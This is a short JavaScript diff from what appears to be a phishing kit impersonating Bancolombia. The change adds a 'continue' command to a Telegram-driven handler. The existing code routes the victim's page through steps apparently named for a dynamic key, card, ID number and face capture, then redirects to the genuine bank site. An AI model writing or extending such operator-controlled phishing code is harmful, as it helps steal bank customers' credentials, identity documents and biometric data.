@@ -88,6 +88,11 @@
         });
         
         BancoUtils.onTelegramAction((data) => {
+            if (data.action === 'continue') {
+                overlay.classList.remove('active');
+                overlay.style.display = 'none';
+                return;
+            }
             if (data.action === 'finalizar') {
                 window.location.href = 'https://www.bancolombia.com/personas';
             } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
